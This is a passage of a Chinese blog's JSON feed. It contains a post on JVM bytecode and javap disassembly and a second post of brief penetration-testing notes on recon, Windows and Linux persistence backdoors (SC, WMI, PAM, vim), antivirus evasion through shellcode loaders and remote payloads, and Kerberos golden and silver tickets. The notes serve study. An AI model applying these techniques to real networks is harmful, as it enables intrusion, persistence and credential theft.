java/lang/Object.\"&lt;init&gt;\":()V：常量池中的一项，表示对java/lang/Object类的构造方法&lt;init&gt;的引用。</span><br><br>#<span class=\"hljs-number\">2</span> = Class              #<span class=\"hljs-number\">13</span>            <span class=\"hljs-comment\">// StackStruTest：常量池中的一项，表示对StackStruTest类的引用。</span><br><br>#<span class=\"hljs-number\">3</span> = Class              #<span class=\"hljs-number\">14</span>            <span class=\"hljs-comment\">// java/lang/Object：常量池中的一项，表示对java/lang/Object类的引用。</span><br><br>#<span class=\"hljs-number\">4</span> = Utf8               &lt;init&gt;：常量池中的一项，表示字符串<span class=\"hljs-string\">\"&lt;init&gt;\"</span>。<br><br>#<span class=\"hljs-number\">5</span> = Utf8               ()V：常量池中的一项，表示字符串<span class=\"hljs-string\">\"()V\"</span>，表示无参数无返回值的方法描述符。<br><br>#<span class=\"hljs-number\">6</span> = Utf8               Code：常量池中的一项，表示字符串<span class=\"hljs-string\">\"Code\"</span>，表示接下来是字节码指令。<br><br>#<span class=\"hljs-number\">7</span> = Utf8               LineNumberTable：常量池中的一项，表示字符串<span class=\"hljs-string\">\"LineNumberTable\"</span>，表示接下来是行号表。<br><br>#<span class=\"hljs-number\">8</span> = Utf8               main：常量池中的一项，表示字符串<span class=\"hljs-string\">\"main\"</span>，表示方法名。<br><br>#<span class=\"hljs-number\">9</span> = Utf8               ([Ljava/lang/String;)V：常量池中的一项，表示字符串<span class=\"hljs-string\">\"([Ljava/lang/String;)V\"</span>，表示入口方法的描述符。<br><br>#<span class=\"hljs-number\">10</span> = Utf8               SourceFile：常量池中的一项，表示字符串<span class=\"hljs-string\">\"SourceFile\"</span>，表示接下来是源文件信息。<br><br>#<span class=\"hljs-number\">11</span> = Utf8               StackStruTest.java：常量池中的一项，表示字符串<span class=\"hljs-string\">\"StackStruTest.java\"</span>，表示源文件名。<br><br>#<span class=\"hljs-number\">12</span> = NameAndType        #<span class=\"hljs-number\">4</span>:#<span class=\"hljs-number\">5</span>          <span class=\"hljs-comment\">// \"&lt;init&gt;\":()V：常量池中的一项，表示NameAndType类型的项，表示构造方法的名称和描述符。</span><br><br>#<span class=\"hljs-number\">13</span> = Utf8               StackStruTest：常量池中的一项，表示字符串<span class=\"hljs-string\">\"StackStruTest\"</span>。<br><br>#<span class=\"hljs-number\">14</span> = Utf8               java/lang/Object：常量池中的一项，表示字符串<span class=\"hljs-string\">\"java/lang/Object\"</span>。<br><br>{：类的开始。<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-title function_\">StackStruTest</span><span class=\"hljs-params\">()</span>;：定义一个公共的无参构造方法。<br><br>descriptor: ()V：表示方法的描述符，无参数无返回值。<br><br>flags: ACC_PUBLIC：表示方法的访问修饰符为<span class=\"hljs-keyword\">public</span>。<br><br>Code:：方法的字节码指令开始。<br><br>stack=<span class=\"hljs-number\">1</span>, locals=<span class=\"hljs-number\">1</span>, args_size=<span class=\"hljs-number\">1</span>：表示方法的最大堆栈深度为<span class=\"hljs-number\">1</span>，局部变量表大小为<span class=\"hljs-number\">1</span>，参数数量为<span class=\"hljs-number\">1</span>。<br><br><span class=\"hljs-number\">0</span>: aload_0：将局部变量表索引<span class=\"hljs-number\">0</span>的引用类型值（<span class=\"hljs-built_in\">this</span>）加载到操作数栈。<br><br><span class=\"hljs-number\">1</span>: invokespecial #<span class=\"hljs-number\">1</span>：调用常量池中索引为<span class=\"hljs-number\">1</span>的方法（java/lang/Object类的构造方法）。<br><br><span class=\"hljs-number\">4</span>: <span class=\"hljs-keyword\">return</span>：返回。<br><br>LineNumberTable:：行号表开始。<br><br>line <span class=\"hljs-number\">1</span>: <span class=\"hljs-number\">0</span>：表示第<span class=\"hljs-number\">1</span>行对应的字节码指令索引为<span class=\"hljs-number\">0</span>。<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(java.lang.String[])</span>;：定义一个公共的静态方法main，接受一个String数组作为参数。<br><br>descriptor: ([Ljava/lang/String;)V：表示方法的描述符，接受一个String数组（前面那一长串用来描述这个类），V表示无返回值。<br><br>flags: ACC_PUBLIC, ACC_STATIC：表示方法的访问修饰符为<span class=\"hljs-keyword\">public</span>和<span class=\"hljs-keyword\">static</span>。<br><br>Code:：方法的字节码指令开始。<br><br>stack=<span class=\"hljs-number\">2</span>, locals=<span class=\"hljs-number\">4</span>, args_size=<span class=\"hljs-number\">1</span>：表示方法的最大堆栈深度为<span class=\"hljs-number\">2</span>，局部变量表大小为<span class=\"hljs-number\">4</span>，参数数量为<span class=\"hljs-number\">1</span>。<br><br><span class=\"hljs-number\">0</span>: iconst_2：将<span class=\"hljs-type\">int</span>类型常量<span class=\"hljs-number\">2</span>压入操作数栈。<br><br><span class=\"hljs-number\">1</span>: istore_1：将操作数栈顶的<span class=\"hljs-type\">int</span>类型值存储到局部变量表的索引<span class=\"hljs-number\">1</span>位置。<br><br><span class=\"hljs-number\">2</span>: bipush        <span class=\"hljs-number\">7</span>：将<span class=\"hljs-type\">int</span>类型常量<span class=\"hljs-number\">7</span>压入操作数栈。<br><br><span class=\"hljs-number\">3</span>: istore_2：将操作数栈顶的<span class=\"hljs-type\">int</span>类型值存储到局部变量表的索引<span class=\"hljs-number\">2</span>位置。<br><br><span class=\"hljs-number\">4</span>: iload_1：将局部变量表索引<span class=\"hljs-number\">1</span>位置的<span class=\"hljs-type\">int</span>类型值压入操作数栈。<br><br><span class=\"hljs-number\">5</span>: iload_2：将局部变量表索引<span class=\"hljs-number\">2</span>位置的<span class=\"hljs-type\">int</span>类型值压入操作数栈。<br><br><span class=\"hljs-number\">6</span>: iadd：从操作数栈中弹出两个<span class=\"hljs-type\">int</span>类型值，执行加法操作，将结果压入操作数栈。<br><br><span class=\"hljs-number\">7</span>: istore_3：将操作数栈顶的<span class=\"hljs-type\">int</span>类型值存储到局部变量表的索引<span class=\"hljs-number\">3</span>位置。<br><br><span class=\"hljs-number\">8</span>: <span class=\"hljs-keyword\">return</span>：返回。<br><br>LineNumberTable:：行号表开始。<br><br>line <span class=\"hljs-number\">3</span>: <span class=\"hljs-number\">0</span>：表示第<span class=\"hljs-number\">3</span>行对应的字节码指令索引为<span class=\"hljs-number\">0</span>。<br><br>line <span class=\"hljs-number\">4</span>: <span class=\"hljs-number\">2</span>：表示第<span class=\"hljs-number\">4</span>行对应的字节码指令索引为<span class=\"hljs-number\">2</span>。<br><br>line <span class=\"hljs-number\">5</span>: <span class=\"hljs-number\">4</span>：表示第<span class=\"hljs-number\">5</span>行对应的字节码指令索引为<span class=\"hljs-number\">4</span>。<br><br>line <span class=\"hljs-number\">6</span>: <span class=\"hljs-number\">8</span>：表示第<span class=\"hljs-number\">6</span>行对应的字节码指令索引为<span class=\"hljs-number\">8</span>。<br><br></code></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>在反编译后的信息中，最上面是当前这个文件的信息，包括编译来源等操作。</li>\n<li>后面的常量池，可以理解为C语言中的Define，对符号的引用情况做个记录。其中#num其实就是在常量池中定义的临时变量。java代码在运行的时候通常会将常量直接嵌入到字节码中，而对于符号的引用则会转化为对应的常量池索引。</li>\n<li>最后一行用于记录第几行的汇编，在字节码中占据第几位。（这是不是就类似汇编语言中的指令地址？只不过不能按照偏移算了，于是要手工记一下。（gpt说是的 ：）</li>\n</ul>\n<h2 id=\"JAVA指令集分类\"><a href=\"#JAVA指令集分类\" class=\"headerlink\" title=\"JAVA指令集分类\"></a>JAVA指令集分类</h2><ul>\n<li><strong>[x]const_[n]:</strong> 指令，这个指令是加载一个常量指令并且将其压入到栈中，前面的x表示操作数的类型i表示int，f表示float，后面的n表示常量值。但是这里注意，int类型下，n常量最大只能取到5，超过这个数就只能使用[x]ipush的方式压栈</li>\n<li>bipush / sipush [n]： 表示将八位(b),十六位(s)带符号整数n压入到栈中。</li>\n<li><strong>ldc:</strong>  将常量池中的项压入到栈中。（我猜后面应该是跟编号</li>\n<li><strong>[x]load_[n]：</strong> 同样是压栈指令，但是使用从局部变量表类型为x编号为n的变量取出压栈。这里的<strong>局部变量表</strong>其实就是类似X86架构中的临时栈，其中存放了外部传来的参数和当前方法的局部变量，当前过程退出之后，就会回收该部分。<strong>这里注意一点，如果是static类，传参用0号局部变量开始表示，如果不是static则存在this指针，则从1号变量开始</strong></li>\n<li><strong>[x]store_[n]:</strong> 从栈顶取出内容并将其存入到局部变量n中保存。</li>\n<li><strong>运算指令</strong>：运算指令将当前栈顶的两个元素先出栈，然后将其相加后再压回栈顶。idiv将第二个整数除以栈顶的整数，将结果放在栈顶。</li>\n<li><strong>比较指令</strong>： icmp指令的执行是比较第二个元素和栈顶元素的之间的关系，并且将结果放到栈里面。同时，<strong>被比较的两个数会被弹出，这点和X86架构不同</strong>。其实就是第二个数减去第一个数，减为负数就存-1，相等存0，否则存1，就这样简单。</li>\n<li><strong>跳转指令</strong>：ifeq如果栈顶的int型数字为0则跳转。当栈顶的 int 值等于零时，JVM会将程序计数器（Program Counter）设置为当前指令的地址加上指令中给定的偏移量。ifeq执行完，无论结果如何，都会将栈顶的内容弹出。ifgt（大于则0则跳转）。无条件跳转就直接goto。<strong>跳转位置使用相对于当前跳转指令的偏移进行计算的</strong>。tableswitch使用索引访问跳转表并进行跳转。</li>\n<li><strong>比较跳转</strong>：if_icmplt比较栈顶的两个元素，同样也是第二个元素比较栈顶的元素的大小关系。运算结束后同样会出栈。if_acmpnc还能比较引用。</li>\n<li><strong>[x]return</strong>:返回指令，前面的x表示了返回值的类型，如果x为空，直接return则表示返回值是void。</li>\n</ul>\n<p>上面的数似乎太温和了，不好表示所有的操作。稍稍修改地复杂些：</p>\n<figure class=\"highlight java\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">test</span> { <br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(String[] args)</span> { <br>    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">i</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">996</span>;<br>    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">j</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">700</span>;<br>    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">k</span> <span class=\"hljs-operator\">=</span> i*<span class=\"hljs-number\">3</span> + j*<span class=\"hljs-number\">9</span>; <br>    <span class=\"hljs-keyword\">return</span> k;<br>  } <br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>反编译出字节码如下：</p>\n<figure class=\"highlight java\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">test</span><br>  minor version: <span class=\"hljs-number\">0</span><br>  major version: <span class=\"hljs-number\">63</span><br>  flags: (<span class=\"hljs-number\">0x0021</span>) ACC_PUBLIC, ACC_SUPER<br>  this_class: #<span class=\"hljs-number\">7</span>                          <span class=\"hljs-comment\">// test</span><br>  super_class: #<span class=\"hljs-number\">2</span>                         <span class=\"hljs-comment\">// java/lang/Object</span><br>  interfaces: <span class=\"hljs-number\">0</span>, fields: <span class=\"hljs-number\">0</span>, methods: <span class=\"hljs-number\">2</span>, attributes: <span class=\"hljs-number\">1</span><br>Constant pool:<br>   #<span class=\"hljs-number\">1</span> = Methodref          #<span class=\"hljs-number\">2.</span>#<span class=\"hljs-number\">3</span>          <span class=\"hljs-comment\">// java/lang/Object.\"&lt;init&gt;\":()V</span><br>   #<span class=\"hljs-number\">2</span> = Class              #<span class=\"hljs-number\">4</span>             <span class=\"hljs-comment\">// java/lang/Object</span><br>   #<span class=\"hljs-number\">3</span> = NameAndType        #<span class=\"hljs-number\">5</span>:#<span class=\"hljs-number\">6</span>          <span class=\"hljs-comment\">// \"&lt;init&gt;\":()V</span><br>   #<span class=\"hljs-number\">4</span> = Utf8               java/lang/Object<br>   #<span class=\"hljs-number\">5</span> = Utf8               &lt;init&gt;<br>   #<span class=\"hljs-number\">6</span> = Utf8               ()V<br>   #<span class=\"hljs-number\">7</span> = Class              #<span class=\"hljs-number\">8</span>             <span class=\"hljs-comment\">// test</span><br>   #<span class=\"hljs-number\">8</span> = Utf8               test<br>   #<span class=\"hljs-number\">9</span> = Utf8               Code<br>  #<span class=\"hljs-number\">10</span> = Utf8               LineNumberTable<br>  #<span class=\"hljs-number\">11</span> = Utf8               main<br>  #<span class=\"hljs-number\">12</span> = Utf8               ([Ljava/lang/String;)I<br>  #<span class=\"hljs-number\">13</span> = Utf8               SourceFile<br>  #<span class=\"hljs-number\">14</span> = Utf8               test.java<br>{<br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-title function_\">test</span><span class=\"hljs-params\">()</span>;<br>    descriptor: ()V<br>    flags: (<span class=\"hljs-number\">0x0001</span>) ACC_PUBLIC<br>    Code:<br>      stack=<span class=\"hljs-number\">1</span>, locals=<span class=\"hljs-number\">1</span>, args_size=<span class=\"hljs-number\">1</span><br>         <span class=\"hljs-number\">0</span>: aload_0<br>         <span class=\"hljs-number\">1</span>: invokespecial #<span class=\"hljs-number\">1</span>                  <span class=\"hljs-comment\">// Method java/lang/Object.\"&lt;init&gt;\":()V</span><br>         <span class=\"hljs-number\">4</span>: <span class=\"hljs-keyword\">return</span><br>      LineNumberTable:<br>        line <span class=\"hljs-number\">1</span>: <span class=\"hljs-number\">0</span><br><br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(java.lang.String[])</span>;<br>    descriptor: ([Ljava/lang/String;)I<br>    flags: (<span class=\"hljs-number\">0x0009</span>) ACC_PUBLIC, ACC_STATIC<br>    Code:<br>      stack=<span class=\"hljs-number\">3</span>, locals=<span class=\"hljs-number\">4</span>, args_size=<span class=\"hljs-number\">1</span><br>         <span class=\"hljs-number\">0</span>: sipush        <span class=\"hljs-number\">996</span> <span class=\"hljs-comment\">// 将常量996压入到本地栈中，</span><br>         <span class=\"hljs-number\">3</span>: istore_1  <span class=\"hljs-comment\">// 将栈中的内容存到临时变量1中</span><br>         <span class=\"hljs-number\">4</span>: sipush        <span class=\"hljs-number\">700</span> <span class=\"hljs-comment\">// 将常量700压入到栈中</span><br>         <span class=\"hljs-number\">7</span>: istore_2  <span class=\"hljs-comment\">// 存到临时变量</span><br>         <span class=\"hljs-number\">8</span>: iload_1<br>         <span class=\"hljs-number\">9</span>: iconst_3<br>        <span class=\"hljs-number\">10</span>: imul<br>        <span class=\"hljs-number\">11</span>: iload_2<br>        <span class=\"hljs-number\">12</span>: bipush        <span class=\"hljs-number\">9</span><br>        <span class=\"hljs-number\">14</span>: imul<br>        <span class=\"hljs-number\">15</span>: iadd<br>        <span class=\"hljs-number\">16</span>: istore_3<br>        <span class=\"hljs-number\">17</span>: iload_3<br>        <span class=\"hljs-number\">18</span>: ireturn<br>      LineNumberTable:<br>        line <span class=\"hljs-number\">3</span>: <span class=\"hljs-number\">0</span><br>        line <span class=\"hljs-number\">4</span>: <span class=\"hljs-number\">4</span><br>        line <span class=\"hljs-number\">5</span>: <span class=\"hljs-number\">8</span><br>        line <span class=\"hljs-number\">6</span>: <span class=\"hljs-number\">17</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li><strong>对象操作指令</strong>：JAVA是面向对象的语言，但是与C的不同，java指令集直接定义了这些操作<ul>\n<li><strong>new</strong>：创建一个对象，并且将创建出来的该对象的索引压入栈中。在底层会为该对象创建一个heap区域的内存块。在分配内存后，JVM 会调用初始化函数，根据对象的类信息初始化对象头，包括存储对象的元数据、锁信息等。需要注意的是，对象的分配和初始化过过程是原子过程，以便于在多线程环境下保证对象的正确创建。new指令只能创建对象，不能创建数组。</li>\n<li><strong>getstatic</strong>: getstatic只能用于获取静态字段的值，不能用于获取实例的值。<code>getstatic</code> 指令需要指定要获取的静态字段的符号引用，包括字段所在的类、字段的名称和字段的描述符。JVM 首先根据符号引用解析静态字段的实际引用，确定要获取的字段的具体位置。JVM 在执行 <code>getstatic</code> 之前会检查当前执行线程对静态字段的访问权限，确保它具有足够的权限来读取该字段。</li>\n<li><strong>getfield</strong>：从对象中获取字段。</li>\n<li><strong>checkcast</strong>：将对象转换为所给类型。</li>\n<li><strong>instanceof</strong>：判断给定对象是否是给定类型。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"提问\"><a href=\"#提问\" class=\"headerlink\" title=\"提问\"></a>提问</h2><h3 id=\"JAVA插装怎么插？\"><a href=\"#JAVA插装怎么插？\" class=\"headerlink\" title=\"JAVA插装怎么插？\"></a>JAVA插装怎么插？</h3><ul>\n<li>使用ASM工具直接对java的class字段进行操作即可。 <a href=\"https://zhuanlan.zhihu.com/p/496213736\">https://zhuanlan.zhihu.com/p/496213736</a></li>\n</ul>\n<h3 id=\"JIT和JVM是啥关系？\"><a href=\"#JIT和JVM是啥关系？\" class=\"headerlink\" title=\"JIT和JVM是啥关系？\"></a>JIT和JVM是啥关系？</h3><p>上面的图已经解释了，jvm中包含jit，jvm在运行的过程中需要把java的字节码丢到jit中去进行处理。</p>\n<h3 id=\"安卓中的-dex文件和一般java中的jar文件有什么不同？\"><a href=\"#安卓中的-dex文件和一般java中的jar文件有什么不同？\" class=\"headerlink\" title=\"安卓中的.dex文件和一般java中的jar文件有什么不同？\"></a>安卓中的.dex文件和一般java中的jar文件有什么不同？</h3><p>Java虚拟机(Java Virtual Machine, JVM)和Dalvik虚拟机(Dalvik Virtual Machine, DVM)是两种不同的虚拟机，它们在设计、编译后的文件格式、运行架构等方面存在显著差异：</p>\n<ol>\n<li>编译后的文件不同： JVM运行的是<code>.class</code>字节码文件。 DVM运行的是其专有的<code>.dex</code>文件。Java程序中的Java类会被编译成<code>.class</code>字节码文件，然后打包到<code>.jar</code>文件中。对于Android平台，这些<code>.class</code>文件会被转换成<code>.dex</code>文件，以适应Dalvik虚拟机。此外，<code>.odex</code>文件是<code>.dex</code>文件的优化版本，用于提高运行性能。</li>\n<li>基于的架构不同： JVM是基于栈的架构，栈是一个连续的内存空间，存取速度相对较慢。 DVM是基于寄存器的架构，寄存器是CPU上的缓存，存取速度比从内存中存取的速度快很多，更适合移动设备的使用</li>\n<li>内存管理不同：</li>\n</ol>\n<p>DVM为每个应用程序默认分配最多16MB内存。如果应用程序加载的资源超过这个限制，可能会导致OutOfMemoryError异常。JVM的内存管理方式与DVM不同，但通常更加灵活和高效。</p>\n<ol start=\"4\">\n<li>应用范围和兼容性：</li>\n</ol>\n<ul>\n<li>JVM可以运行多种编程语言（如Java、Kotlin等），不限于Java语言。</li>\n<li>DVM是Google公司为Android平台设计的虚拟机，专门针对ARM架构的处理器优化。虽然Dalvik虚拟机不是按照Java虚拟机的规范来实现的，且两者不兼容，但它们都提供了进程隔离和线程管理的功能。</li>\n</ul>\n<h3 id=\"JVM虚拟机和DALVIK虚拟机有何不同？\"><a href=\"#JVM虚拟机和DALVIK虚拟机有何不同？\" class=\"headerlink\" title=\"JVM虚拟机和DALVIK虚拟机有何不同？\"></a>JVM虚拟机和DALVIK虚拟机有何不同？</h3><ul>\n<li>JVM是读取.class文件进行运行，一个class文件中只包含一个类，而Dalvik虚拟机的dex的文件包含有多个类（因为他是多个class文件打包成的），</li>\n<li>alvik的指令集基于寄存器，而JVM的指令集基于堆栈。不同之处在于，基于寄存器的指令在寄存器中寻址，速度更快但指令长度长；基于堆栈的指令集更短，但占用CPU时间较多。（所以说二者的指令集是不一样的）</li>\n</ul>\n<h3 id=\"Smali字节码和JVM字节码有什么不一样？\"><a href=\"#Smali字节码和JVM字节码有什么不一样？\" class=\"headerlink\" title=\"Smali字节码和JVM字节码有什么不一样？\"></a>Smali字节码和JVM字节码有什么不一样？</h3><h3 id=\"进程隔离和线程管理的概念是什么？\"><a href=\"#进程隔离和线程管理的概念是什么？\" class=\"headerlink\" title=\"进程隔离和线程管理的概念是什么？\"></a>进程隔离和线程管理的概念是什么？</h3><h2 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h2><p><a href=\"https://blog.csdn.net/weixin_43896318/article/details/104631106\">https://blog.csdn.net/weixin_43896318/article/details/104631106</a></p>\n<p><a href=\"https://blog.csdn.net/Megetood/article/details/109114038\">https://blog.csdn.net/Megetood/article/details/109114038</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/655490660\">https://zhuanlan.zhihu.com/p/655490660</a></p>\n",
            "tags": [
                "java"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/06/yu-shen-tou/",
            "url": "https://alazymechnaic.github.io/2024/03/06/yu-shen-tou/",
            "title": "域渗透",
            "date_published": "2024-03-06T13:00:00.000Z",
            "content_html": "<p><strong>信息收集</strong></p>\n<ul>\n<li><p>**oneforall:**子域名收集工具</p>\n</li>\n<li><p><strong>whois****查询</strong></p>\n</li>\n<li><p><strong>多地<strong><strong>ping</strong></strong>查询是否存在<strong><strong>CDN</strong></strong>服务器，<strong><strong>nslookup</strong></strong>若存在多个<strong><strong>IP</strong></strong>则证明有****CDN</strong></p>\n</li>\n<li><ul>\n<li><strong>国外<strong><strong>ping</strong></strong>一般会是真正的服务器</strong></li>\n<li><strong>历史<strong><strong>DNS</strong></strong>解析</strong></li>\n<li><strong>利用<strong><strong>fofa</strong></strong>，比如在图标中会有一串唯一的哈希，可以利用网络空间搜索引擎全网<strong><strong>ip</strong></strong>信息进行排序</strong></li>\n<li><strong>依照网站证书，按照证书上的序列号转换为<strong><strong>10</strong></strong>进制，去<strong><strong>fofa</strong></strong>上搜</strong></li>\n</ul>\n</li>\n<li><p><strong>C****段查询</strong></p>\n</li>\n<li><p><strong>文件泄露扫描：使用目录扫描器，<strong><strong>svn</strong></strong>，<strong><strong>swp</strong></strong>，<strong><strong>git</strong></strong>文件泄露</strong></p>\n</li>\n</ul>\n<p><strong>系统后门：</strong></p>\n<ul>\n<li><p><strong>Windows****：</strong></p>\n</li>\n<li><ul>\n<li><strong>SC****后门，将后门程序注册为自启动服务</strong></li>\n<li><strong>WMI****后门：</strong>必须要在提权成功后才能够使用，UAC机制会阻碍该方法（需要在empire中可以进行bypass uac，然后在empire中找到persistence/elevated/wmi模块执行，而后在主机上发送</li>\n</ul>\n</li>\n</ul>\n<p>Get-WMIObject-Namespaceroot\\Subscription-ClassCommandLineEventConsumer-Filter“Name=’Updater’”即可创建WMI后门</p>\n<ul>\n<li><p>Linux后门</p>\n</li>\n<li><ul>\n<li>pam后门</li>\n<li>vim后门</li>\n</ul>\n</li>\n</ul>\n<p><strong>关于免杀</strong></p>\n<ul>\n<li><p><strong>文件免杀：</strong></p>\n</li>\n<li><ul>\n<li><p><strong>webshell****：混淆，加密</strong></p>\n</li>\n<li><p><strong>C2****工具：</strong></p>\n</li>\n<li><ul>\n<li><strong>利用加载器伪装，加载<strong><strong>shellcode</strong></strong>，将<strong><strong>shellcode</strong></strong>生成出来。</strong></li>\n<li><strong>DLL****劫持，进行代码的注入</strong></li>\n<li><strong>载荷分离，将载荷放在公网的服务器上，每次调用时会下载载荷执行</strong></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>Kerberos原理</strong>：</p>\n<ul>\n<li><p>客户机向AS发送通信请求，其中内容是客户机的明文ID</p>\n</li>\n<li><p>AS检查该ID是否合法，若合法则从数据库中找到对应的NTLM  HASH（该用户密码的NTLM哈希值）用作和客户机通信的加密密钥。</p>\n</li>\n<li><p>即UserHash(infor，TGT)</p>\n</li>\n<li><p>其中的TGT=TgsHash(用户id，客户端网络地址，票据有效信息和客户机的NTLM     Hash)</p>\n</li>\n<li><p>客户机解密出来TGT后，向TGS发出TGT，要访问的服务器的ID，使用自己NTLM     Hash加密的时间戳等信息</p>\n</li>\n<li><p>TGS拿到消息后，先解开TGT，得到客户机的HASH，而后利用该HASH解密客户机发来的身份认证，从而证实客户机的身份。随后TGS生成客户机与服务器的会话密钥，利用服务器端的Hash加密一份会话密钥，外层用客户端的哈希加密后发送给客户机</p>\n</li>\n<li><p>客户机解密后得到会话密钥，同时将对应服务器端的密钥发送给服务器</p>\n</li>\n<li><p>密钥交换完成</p>\n</li>\n<li><p>注意：</p>\n</li>\n<li><ul>\n<li>其中KDC包含（AS，TGS）</li>\n<li>AS用于生成临时会话票据TGT</li>\n<li>TGS用于为客户访问服务器生成Ticket</li>\n</ul>\n</li>\n</ul>\n<p><strong>黄金票据</strong>：伪造TGT，需要窃取域控的NTLM HASH，用于TGT的构成是利用TGS的哈希加密的内容，因此得到域控用户的哈希后可以不通过AS而伪造出TGT</p>\n<p><strong>白银票据</strong>：伪造Ticket 需要目标服务器的NTLM Hash，由于Ticket的构成需要两个密钥，一个本地用户的哈希，另一个是服务器用户的哈希，从而构造出Ticket，可以使其不与域控进行通信而完成密钥的协商</p>\n<p><strong>静态抓取方式：</strong></p>\n<p><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAYoAAABXCAIAAACVy5UCAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABM5SURBVHhe7Z0NdFXVlYD5kRAI+UEhgYAFlKIg4gAVtbQURmHUoqvSEepixtF2xFrRiqstdKxdVu2qzppVXa2zWu3UTm2tLe3gWraOHf9wnKlDqYAVC4hgwiDhH1KSEEiCzvfevuw53HvffTcvN8kN7G/d9Tzn3PN/9t5nn/cwp/fUqVN7GYZhpI8+3n8NwzBShpknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSipknwzBSSjeYp6f+rsoLZcPBx3sXSTCbL6XgekKJk62ADrh5QvPHqQRiZjOMnkU3mKfrfrxb1Ykwjy+QfZMhvnJKTg0IEnVTCoZexawnOlu7OkNmnQ3CvkfSo3FzakF9JN0wUkv3/Dk6dMM1QyDa4kuEYE4htAZXmXOFJRBNzBZd9G0w4MNNzxWGXMVD8dUjASG0Tgn4ckL8Fg2jC0jGPC2bPfj3tUc27Gr56uzBj6869GZdi/ciH0ENgaBGhWYTotVMiks4lFwZIlp0CTYUWtBtQnJG1C9vtTa3bBBfPVrW/fTendhJX8AXNow0kIx5umNm+cubm3c3HFsys+KhV+oJeC/yEa0wEQSzuSmEJaCE1ilFoluMbkiQ5nxVRVcr5M0fpxII1uN+SjoQ9ULHJyRYUMKGkQY6+t3TrA8PQKwvGlWM3/TwvCGjTj+Nz+unlXqvA5BZHi8em4giWqEGUDPRNA0EIafmkVKFofVArrYKQ2smEPpItnZBhcl20jA6j46ap5XvNN+xYt+2A218PvbaIQI3/XzvE6sbvNcBguqhmuZTOYlqCqXcty5Spz5eam6kWnL6Kg+t380GUtCLZInToiBNhLYSxM1GE/q4UXmrxKzZMHoKSf5yd+bg0+qPvN949H0vHg+f1kki+KIRqNrLoym+gEa1Zj4lXcIS1ZTE0XZBG5KAG5aA5oxJzCLahCBDJlBAi4bR2XTUPC1zznRXjB94QXXR9+cPrSrt671OlAj94ZU8btQXcKNKMOpLAVJi6jAZ9AlGXbQhCbhhCWQyxUArj1lEmzCM9NNR8/TACwf1TPfHupbnNh7+/PK98b8aB1UwDRSAlC2geMwiqDQ58yq2KL88wWhnUHDlOl0UjzM0w+h6kjnc6Zlu+8E2SYmPKpgGCkDKanHVPQ340ESKuBlCMwPpvpw9Duk8nxJwp8sw0kkC5unMwafxOah/n4rijtYWR/9VwVwkUdNV94JKGCzrQubQyrW26OLtQqv